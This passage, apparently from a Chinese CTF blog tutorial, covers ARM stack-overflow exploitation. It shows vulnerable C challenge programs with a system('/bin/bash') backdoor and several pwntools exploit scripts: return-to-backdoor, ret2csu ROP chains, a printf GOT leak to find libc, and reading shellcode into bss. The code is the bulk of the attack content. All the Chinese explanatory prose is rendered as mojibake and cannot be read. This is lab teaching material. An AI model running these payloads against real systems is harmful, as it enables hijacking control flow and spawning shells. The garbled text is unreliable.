<span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">    system(<span class="string">&quot;echo &#x27;PIG-007!&#x27;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Welcome to my world!I am PIG-007!&quot;</span>);</span><br><span class="line">    myFunc();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h3 id="3-åˆ©ç”¨ï¼š"   >
          <a href="#3-åˆ©ç”¨ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-åˆ©ç”¨ï¼š" class="headerlink" title="(3)åˆ©ç”¨ï¼š"></a>(3)åˆ©ç”¨ï¼š</h3>
      <p>ä¸€èˆ¬è€Œè¨€éƒ½æ˜¯ä¸å­˜åœ¨PIEçš„</p>

        <h4 id="A-åé—¨"   >
          <a href="#A-åé—¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-åé—¨" class="headerlink" title="A.åé—¨"></a>A.åé—¨</h4>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">backDoor = <span class="number">0x1050C</span></span><br><span class="line"></span><br><span class="line">fake_FP = <span class="number">0xdeadbeef</span></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">0x10</span></span><br><span class="line">payload += p32(fake_FP)</span><br><span class="line">payload += p32(backDoor)</span><br><span class="line"></span><br><span class="line"><span class="comment">#mulArchDbg()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></div></figure>


        <h4 id="B-ROPé“¾æ¡"   >
          <a href="#B-ROPé“¾æ¡" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-ROPé“¾æ¡" class="headerlink" title="B.ROPé“¾æ¡"></a>B.ROPé“¾æ¡</h4>
      
        <h5 id="ğŸ”ºæ³¨æ„ï¼š"   >
          <a href="#ğŸ”ºæ³¨æ„ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºæ³¨æ„ï¼š" class="headerlink" title="ğŸ”ºæ³¨æ„ï¼š"></a>ğŸ”ºæ³¨æ„ï¼š</h5>
      <p>ä¸çŸ¥é“ä¸ºå•¥ï¼Œåœ¨æˆ‘çš„GDBè°ƒè¯•æ—¶ï¼Œæ‰“å°å‡ºæ¥çš„å‡½æ•°åœ°å€å’ŒçœŸå®çš„å‡½æ•°åœ°å€ä¸ä¸€æ ·ï¼š</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211104115048.png" alt="image-20211104115041178"></p>
<p>ä¸Šé¢0x2101cæ˜¯systemçš„gotè¡¨åœ°å€ï¼Œå¯æ˜¯å’ŒGDBæ‰“å°çš„å‡½æ•°åœ°å€ä¸ä¸€æ ·ï¼Œä½†æ˜¯å®é™…ä¸Šlibc.soæ–‡ä»¶æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œå› ä¸ºå¯ä»¥æ­£å¸¸getshellã€‚ä¹‹åå’¨è¯¢äº†luckyå¸ˆå‚…ä¹‹åï¼Œåœ¨å®¤å‹çš„å¸®åŠ©ä¸‹ï¼Œç¼–è¯‘äº†å„ä¸ªç‰ˆæœ¬çš„armæ¶æ„ä¸‹çš„glibcï¼Œå†é€šè¿‡qemuåŠ è½½è¿è¡Œåº“å°±æ­£å¸¸äº†ã€‚</p>

        <h5 id="åŠ«æŒæ ˆæ¨¡å‹ï¼š"   >
          <a href="#åŠ«æŒæ ˆæ¨¡å‹ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#åŠ«æŒæ ˆæ¨¡å‹ï¼š" class="headerlink" title="åŠ«æŒæ ˆæ¨¡å‹ï¼š"></a>åŠ«æŒæ ˆæ¨¡å‹ï¼š</h5>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+-------------+</span><br><span class="line">|             |</span><br><span class="line">|  padding    |</span><br><span class="line">+-------------+</span><br><span class="line">|  Last FP    | </span><br><span class="line">+-------------+</span><br><span class="line">|gadgets_addr | &lt;- frame pointer(return_addr)</span><br><span class="line">+-------------+</span><br></pre></td></tr></table></div></figure>


        <h5 id="A-æº¢å‡ºå­—èŠ‚ä¸å—é™åˆ¶"   >
          <a href="#A-æº¢å‡ºå­—èŠ‚ä¸å—é™åˆ¶" class="heading-link"><i class="fas fa-link"></i></a><a href="#A-æº¢å‡ºå­—èŠ‚ä¸å—é™åˆ¶" class="headerlink" title="A.æº¢å‡ºå­—èŠ‚ä¸å—é™åˆ¶"></a>A.æº¢å‡ºå­—èŠ‚ä¸å—é™åˆ¶</h5>
      
        <h6 id="a-å­˜åœ¨pop-r0-pc"   >
          <a href="#a-å­˜åœ¨pop-r0-pc" class="heading-link"><i class="fas fa-link"></i></a><a href="#a-å­˜åœ¨pop-r0-pc" class="headerlink" title="a.å­˜åœ¨pop {r0,*, pc}"></a>a.å­˜åœ¨<code>pop &#123;r0,*, pc&#125;</code></h6>
      <p>å½“æœ‰<code>pop &#123;r0,*, pc&#125;</code>è¿™ç§gadgetï¼Œå½“ç„¶å°±æ˜¯æƒ³æ€ä¹ˆç”¨å°±æ€ä¹ˆç”¨ï¼Œä½†æ²¡æœ‰çš„æ—¶å€™å¯ä»¥ç”¨å¸¸è§çš„CSUæ¥æ›¿ä»£ã€‚</p>

        <h6 id="b-åˆ©ç”¨csu"   >
          <a href="#b-åˆ©ç”¨csu" class="heading-link"><i class="fas fa-link"></i></a><a href="#b-åˆ©ç”¨csu" class="headerlink" title="b.åˆ©ç”¨csu"></a>b.åˆ©ç”¨csu</h6>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#æ³¨é‡Šå¤´</span><br><span class="line"></span><br><span class="line">.text:0001049C                 LDR     R3, [R5],#4                 â‘¡</span><br><span class="line">.text:000104A0                 MOV     R2, R9</span><br><span class="line">.text:000104A4                 MOV     R1, R8</span><br><span class="line">.text:000104A8                 MOV     R0, R7</span><br><span class="line">.text:000104AC                 BLX     R3                          â‘¢</span><br><span class="line">.text:000104B0                 CMP     R6, R4</span><br><span class="line">.text:000104B4                 BNE     loc_10498</span><br><span class="line">.text:000104B8                 LDMFD   SP!, &#123;R4-R10,PC&#125;            â‘ </span><br></pre></td></tr></table></div></figure>

<p>è¿™é‡Œå°±æ˜¯å¾ˆæ­£å¸¸çš„ï¼Œé€šè¿‡â‘ æ¥ä¸ºR4-R10èµ‹å€¼ï¼Œä»¥åŠæ§åˆ¶PCè·³è½¬åˆ°â‘¡ï¼Œå†åˆ©ç”¨R5åœ°å€å¯¹åº”çš„å€¼æ¥èµ‹å€¼ç»™R3å¯¹åº”è·³è½¬ï¼ŒæœŸé—´ä¹Ÿå¯é€šè¿‡R7-R8æ¥æ§åˆ¶R0-R2çš„å‚æ•°ã€‚è¿™é‡Œéœ€è¦æ»¡è¶³R5å¤„ä¿å­˜çš„æ˜¯gotè¡¨åœ°å€ï¼Œå³å°†R5èµ‹å€¼ä¸ºfunc_got_addrå³å¯ã€‚</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">arm_csu</span>(<span class="params">call,u_gadget1,u_gadget2,r0,r1,r2</span>):</span></span><br><span class="line">    payload = p32(u_gadget1)</span><br><span class="line">    payload += p32(<span class="number">0</span>)</span><br><span class="line">    payload += p32(call) <span class="comment">#[r5]-&gt;r3  blx r3</span></span><br><span class="line">    payload += p32(<span class="number">0</span>)</span><br><span class="line">    payload += p32(r0)</span><br><span class="line">    payload += p32(r1)</span><br><span class="line">    payload += p32(r2)</span><br><span class="line">    payload += p32(<span class="number">0</span>)</span><br><span class="line">    payload += p32(u_gadget2)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">u_gadget1 = elf.sym[<span class="string">&#x27;__libc_csu_init&#x27;</span>] + <span class="number">0x54</span></span><br><span class="line">u_gadget2 = elf.sym[<span class="string">&#x27;__libc_csu_init&#x27;</span>] + <span class="number">0x38</span></span><br><span class="line"></span><br><span class="line">fake_FP = start_addr</span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">0x10</span></span><br><span class="line">payload += p32(fake_FP)</span><br><span class="line">payload += arm_csu(system_got,u_gadget1,u_gadget2,binsh_addr,<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload += p32(start_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></div></figure>



<p>è¿™ä¸ªæ˜¯åŸºäºè°ƒç”¨äº†systemå‡½æ•°ï¼Œæ‰€ä»¥systemå‡½æ•°ä¸­çš„Gotè¡¨ä¸­å·²ç»æœ‰äº†å‡½æ•°åœ°å€ï¼ŒåŒæ ·çš„ï¼Œå½“æ²¡æœ‰æ—¶éœ€è¦æ³„éœ²åœ°å€ï¼Œé€šå¸¸è°ƒç”¨putså‡½æ•°æˆ–è€…printfå‡½æ•°å³å¯æ³„éœ²åœ°å€ï¼Œå¦‚ä¸‹ç›¸å…³è„šæœ¬</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">fake_FP = start_addr</span><br><span class="line">payload = &quot;A&quot;*0x10</span><br><span class="line">payload += p32(fake_FP)</span><br><span class="line">payload += arm_csu(printf_got,u_gadget1,u_gadget2,printf_got,0,0)</span><br><span class="line">payload += p32(0)*7</span><br><span class="line">payload += p32(start_addr)</span><br><span class="line">#mulArchDbg()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">printf_addr = u32Leakbase(0)</span><br><span class="line">libc.address = printf_addr - libc.sym[&#x27;printf&#x27;]</span><br><span class="line">system_addr = libc.sym[&#x27;system&#x27;]</span><br><span class="line">binsh_addr = libc.search(&#x27;/bin/sh&#x27;).next()</span><br><span class="line">lg(&quot;system_addr&quot;,system_addr)</span><br><span class="line">lg(&quot;binsh_addr&quot;,binsh_addr) </span><br></pre></td></tr></table></div></figure>

<p>æ§åˆ¶è¿”å›åœ°å€è¿›å…¥u_gadget1</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105110403.png" alt="image-20211105110402858"></p>
<p>ç„¶åæ§åˆ¶R4~R10å¯„å­˜å™¨ï¼Œè·³è½¬u_gadget2</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105110734.png" alt="image-20211105110734269"></p>
<p>ç„¶åè·³è½¬gotè¡¨ä¸­å‡½æ•°</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105110947.png" alt="image-20211105110946942"></p>
<p>è¿™é‡Œåœ¨è°ƒç”¨CSUæ—¶ä¹Ÿéœ€è¦æ§åˆ¶R6å’ŒR4ï¼Œä¾æ®<code>CMP     R6, R4</code>ï¼Œä½¿å¾—ä¹‹åçš„<code>BNE     loc_10624</code>çŸ­è·³è½¬ä¸æˆç«‹ï¼Œè¿›å…¥åˆ°csuä¸­çš„æœ€åçš„<code>POP     &#123;R4-R10,PC&#125;</code>è¯­å¥ï¼Œè¿™æ—¶å€™å†å°†æ ˆæ§å¥½ï¼Œå°±èƒ½è¿”å›åˆ°startå‡½æ•°é‡æ–°å¼€å§‹äº†ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105112027.png" alt="image-20211105112027065"></p>
<p>ç°åœ¨çš„æ ˆåœ¨æˆ‘ä»¬æœ€å¼€å§‹çš„æ—¶å€™å·²ç»é€šè¿‡ä»¥ä¸‹è¯­å¥æ§åˆ¶å¥½äº†ï¼Œpopä¹‹åå³å¯æ§åˆ¶pcè¿›å…¥startå‡½æ•°é‡æ–°å¼€å§‹ã€‚</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload += p32(0)*7</span><br><span class="line">payload += p32(start_addr)</span><br></pre></td></tr></table></div></figure>

<p>æ³„éœ²åœ°å€ä¹‹åï¼Œå¦‚æœç¨‹åºä¸­æ²¡æœ‰è°ƒç”¨systemï¼Œé‚£ä¹ˆä¾ç„¶ä¹Ÿæ— æ³•é€šè¿‡ret2csuæ¥getshellï¼Œä½†æ˜¯å¯ä»¥é€šè¿‡ä¸‹åˆ—çš„æ¥ä»£æ›¿ï¼š</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pop &#123;r4, r5, r6, r7, r8, sb, sl, pc&#125; 	#pop_R4_R10_PC</span><br><span class="line">pop &#123;r3, pc&#125; 							#pop_r3_pc</span><br><span class="line">mov r0, r7 ; blx r3						#movR0_R7_BLR3</span><br></pre></td></tr></table></div></figure>

<p>è€Œ<code>pop_R4_R10_PC</code>å’Œ<code>movR0_R7_BLR3</code>éƒ½æ˜¯csuä¸­çš„ï¼Œ<code>pop_r3_pc</code>åˆ™éå¸¸å¸¸ç”¨ï¼ŒåŸºæœ¬éƒ½æœ‰ã€‚</p>
<p>è¿™ä¸ªå°±æ˜¯å…ˆæ§R7ï¼Œåœ¨æ§R3ï¼Œæœ€åR7èµ‹ç»™R0ï¼Œè·³è½¬R3è°ƒç”¨æƒ³è°ƒç”¨çš„å‡½æ•°ï¼Œè¿™é‡Œå°±æ˜¯<code>system(&#39;/bin/sh&#39;)</code>ã€‚</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">fake_FP = start_addr</span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">0x10</span></span><br><span class="line">payload += p32(fake_FP)</span><br><span class="line">payload += p32(pop_R4_R10_PC)</span><br><span class="line">payload += p32(<span class="number">0</span>)				<span class="comment">#r4</span></span><br><span class="line">payload += p32(<span class="number">0</span>)				<span class="comment">#r5</span></span><br><span class="line">payload += p32(<span class="number">0</span>) 				<span class="comment">#r6</span></span><br><span class="line">payload += p32(binsh_addr)      <span class="comment">#r7</span></span><br><span class="line">payload += p32(<span class="number">0</span>)				<span class="comment">#r8</span></span><br><span class="line">payload += p32(<span class="number">0</span>)				<span class="comment">#r9</span></span><br><span class="line">payload += p32(<span class="number">0</span>)				<span class="comment">#r10</span></span><br><span class="line">payload += p32(pop_r3_pc)      	<span class="comment">#r3</span></span><br><span class="line">payload += p32(system_addr)</span><br><span class="line">payload += p32(movR0_R7_BLR3)</span><br></pre></td></tr></table></div></figure>

<p>è¿™é‡Œçš„systemå‡½æ•°åœ°å€å°±å¾—æ˜¯æ³„éœ²çš„çœŸå®åœ°å€äº†ï¼Œå› ä¸ºèµ‹å€¼è¿‡ç¨‹æ˜¯ç›´æ¥å¯„å­˜å™¨èµ‹å€¼ï¼Œè€Œä¸æ˜¯å–å¯„å­˜å™¨å€¼ä¸ºåœ°å€å†å–å€¼äº†ã€‚</p>
<p>è¿™é‡Œçš„fake_FPåŸºæœ¬æ²¡æœ‰ä»€ä¹ˆç”¨ï¼Œä½†æ˜¯ä¸‹é¢ä»‹ç»çš„å°±ä¼šæœ‰ç”¨äº†ã€‚</p>

        <h5 id="B-æº¢å‡ºå­—èŠ‚å—åˆ°é™åˆ¶"   >
          <a href="#B-æº¢å‡ºå­—èŠ‚å—åˆ°é™åˆ¶" class="heading-link"><i class="fas fa-link"></i></a><a href="#B-æº¢å‡ºå­—èŠ‚å—åˆ°é™åˆ¶" class="headerlink" title="B.æº¢å‡ºå­—èŠ‚å—åˆ°é™åˆ¶"></a>B.æº¢å‡ºå­—èŠ‚å—åˆ°é™åˆ¶</h5>
      <p>å½“æº¢å‡ºå­—èŠ‚å—åˆ°é™åˆ¶ï¼Œæ¯”å¦‚åªèƒ½æº¢å‡º0x10ä¸ªå­—èŠ‚æ—¶ã€‚</p>
<p>å‚ç…§inctf2018-warmupé¢˜ç›®</p>

        <h6 id="a-åˆ©ç”¨readå‡½æ•°-shellcode"   >
          <a href="#a-åˆ©ç”¨readå‡½æ•°-shellcode" class="heading-link"><i class="fas fa-link"></i></a><a href="#a-åˆ©ç”¨readå‡½æ•°-shellcode" class="headerlink" title="a.åˆ©ç”¨readå‡½æ•°+shellcode"></a>a.åˆ©ç”¨readå‡½æ•°+shellcode</h6>
      <p>å½“è°ƒç”¨äº†readå‡½æ•°æ—¶ï¼Œä¸”è¯¥armæ¶æ„ä½¿ç”¨qemuæ¨¡æ‹Ÿï¼Œé‚£ä¹ˆbssæ®µåŸºæœ¬éƒ½æ˜¯å¯æ‰§è¡Œçš„ã€‚(å…·ä½“åŸå› æœªçŸ¥)</p>
<p>é‚£ä¹ˆè°ƒç”¨readå‡½æ•°ä¸€èˆ¬éƒ½æ˜¯å¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:00010540                 MOV     R2, #0x100      ; nbytes</span><br><span class="line">.text:00010544                 MOV     R1, R3          ; buf</span><br><span class="line">.text:00010548                 MOV     R0, #0          ; fd</span><br><span class="line">.text:0001054C                 BL      read</span><br></pre></td></tr></table></div></figure>

<p>è¿™é‡Œå°±å¯ä»¥é€šè¿‡èµ‹å€¼ç»™bufçš„è¯­å¥æ¥åŠ«æŒR1ï¼Œå°†shellcodeè¯»å–åˆ°æˆ‘ä»¬æƒ³æ”¾ç½®çš„ä½ç½®ï¼Œå½“ç„¶ï¼Œè¿™ä¹‹å‰è¿˜æ˜¯å¾—åŠ«æŒR3å¯„å­˜å™¨ï¼Œä¸è¿‡è¿™ä¸ªç›´æ¥é€šè¿‡å¾ˆå¸¸ç”¨çš„gadgetå³å¯ã€‚</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop &#123;r3, pc&#125; 							#pop_r3_pc</span><br></pre></td></tr></table></div></figure>

<p>é‚£ä¹ˆå¦‚ä¸‹æ‰€ç¤º</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">shellcode_addr = bss_addr + <span class="number">0x4</span></span><br><span class="line">fake_FP = bss_addr</span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">0x10</span></span><br><span class="line">payload += p32(fake_FP)</span><br><span class="line">payload += p32(pop_r3_pc)</span><br><span class="line">payload += p32(bss_addr)</span><br><span class="line">payload += p32(read_gadget)</span><br><span class="line"><span class="comment">#mulArchDbg()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(p32(shellcode_addr)+shellcode)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105115257.png" alt="image-20211105115257258"></p>
<p>è¿™æ ·å³å¯è¯»å–shellcodeåˆ°bssæ®µäº†</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105115432.png" alt="image-20211105115432342"></p>
<p>ä¸è¿‡è¿™ä¹Ÿéœ€è¦åŸæœ¬çš„è¯»å–å‡½æ•°è®¾ç½®çš„bufé•¿åº¦è¶³å¤Ÿæ”¾ä¸‹æˆ‘ä»¬çš„shellcodeæ‰è¡Œï¼Œå·²ç»æˆåŠŸè¯»å–</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105115637.png" alt="image-20211105115637472"></p>
<p>è¿™é‡Œçš„fake_FPå°±èµ·ä½œç”¨äº†ï¼Œå› ä¸ºæˆ‘ä»¬åŠ«æŒäº†FPï¼Œæ‰€ä»¥åœ¨myFuncå‡½æ•°ï¼Œå³å­˜åœ¨æº¢å‡ºå‡½æ•°è¿”å›æ—¶ï¼Œé€šè¿‡</p>
<p><code>SUB     SP, R11, #4</code>å°†FPå‡4ä¹‹åèµ‹å€¼ç»™SPï¼Œå°±èƒ½åŠ«æŒæ ˆäº†ï¼Œ</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211105120321.png" alt="image-20211105120320963"></p>
<p>ä¹‹åå†é€šè¿‡<code>POP     &#123;R11,PC&#125;</code>ï¼ŒåŠ«æŒPCï¼Œè¿›å…¥åˆ°shellcodeæ‰§è¡Œã€‚éœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œç”±äºæ˜¯popç»™PCï¼Œæ‰€ä»¥bssæ®µä¸Šè¿˜æ˜¯éœ€è¦æ”¾ä¸Šå¯¹åº”shellcodeå¤„çš„åœ°å€ï¼Œæ‰€ä»¥å‘é€shellcodeçš„è¯­å¥ä¸º</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(p32(shellcode_addr)+shellcode)</span><br></pre></td></tr></table></div></figure>

<p>æœ€åæˆåŠŸgetshellã€‚</p>

        <h4 id="ğŸ”ºå­˜åœ¨PIEæ—¶"   >
          <a href="#ğŸ”ºå­˜åœ¨PIEæ—¶" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºå­˜åœ¨PIEæ—¶" class="headerlink" title="ğŸ”ºå­˜åœ¨PIEæ—¶"></a>ğŸ”ºå­˜åœ¨PIEæ—¶</h4>
      <p>è¿™ç§ä¸€èˆ¬éƒ½æ˜¯éœ€è¦ç»“åˆçˆ†ç ´æ¥è¿›è¡Œäº†ï¼Œæˆ–è€…é¢˜ç›®æœ¬èº«æ³„éœ²åœ°å€ã€‚</p>

        <h2 id="3-å¶å­å‡½æ•°æº¢å‡º"   >
          <a href="#3-å¶å­å‡½æ•°æº¢å‡º" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-å¶å­å‡½æ•°æº¢å‡º" class="headerlink" title="3.å¶å­å‡½æ•°æº¢å‡º"></a>3.å¶å­å‡½æ•°æº¢å‡º</h2>
      
        <h3 id="1-æ ˆæ¨¡å‹-1"   >
          <a href="#1-æ ˆæ¨¡å‹-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-æ ˆæ¨¡å‹-1" class="headerlink" title="(1)æ ˆæ¨¡å‹"></a>(1)æ ˆæ¨¡å‹</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#æ³¨é‡Šå¤´</span><br><span class="line"></span><br><span class="line">+-------------+</span><br><span class="line">|             |</span><br><span class="line">|  padding    |</span><br><span class="line">+-------------+</span><br><span class="line">|  Last FP    | &lt;- frame pointer</span><br><span class="line">+-------------+</span><br></pre></td></tr></table></div></figure>

<p>ä½†æ˜¯è¿™æ ·å°±ä¸å¥½åˆ©ç”¨ï¼Œåªèƒ½åŠ«æŒåˆ°ä¸Šä¸€å±‚å‡½æ•°çš„å‡½æ•°æ ˆï¼Œé‚£ä¹ˆé€šå¸¸ä¼šå°è¯•åŠ«æŒæ ˆè¿ç§»ä¸€æ®µè·ç¦»ï¼Œä½¿å¾—ä¸Šä¸€ä¸ªéå¶å­å‡½æ•°çš„å‰©ä¸‹çš„æ±‡ç¼–ä»£ç æ‰€ç”¨åˆ°çš„æ ˆä¸Šæ•°æ®æ˜¯æˆ‘ä»¬ä¼ªé€ çš„æ ˆä¸­çš„æ•°æ®ï¼Œè¿™æ ·å°±èƒ½å®ŒæˆåŠ«æŒä¸Šä¸€ä¸ªéå¶å­å‡½æ•°çš„è¿”å›åœ°å€ã€‚</p>

        <h3 id="2-é¢˜ç›®ï¼š-1"   >
          <a href="#2-é¢˜ç›®ï¼š-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-é¢˜ç›®ï¼š-1" class="headerlink" title="(2)é¢˜ç›®ï¼š"></a>(2)é¢˜ç›®ï¼š</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> bss[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">backdoor</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">myFunc</span><span class="params">(<span class="keyword">char</span>* nameSrc,<span class="keyword">int</span> amount,<span class="keyword">int</span>* i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">16</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        name[i[<span class="number">0</span>]] = nameSrc[i[<span class="number">0</span>]];</span><br><span class="line">        i[<span class="number">0</span>] = i[<span class="number">0</span>] + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>( i[<span class="number">0</span>] == amount)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i[<span class="number">2</span>] = &#123;<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo &#x27;PIG-007!&#x27;&quot;</span>);</span><br><span class="line">    <span 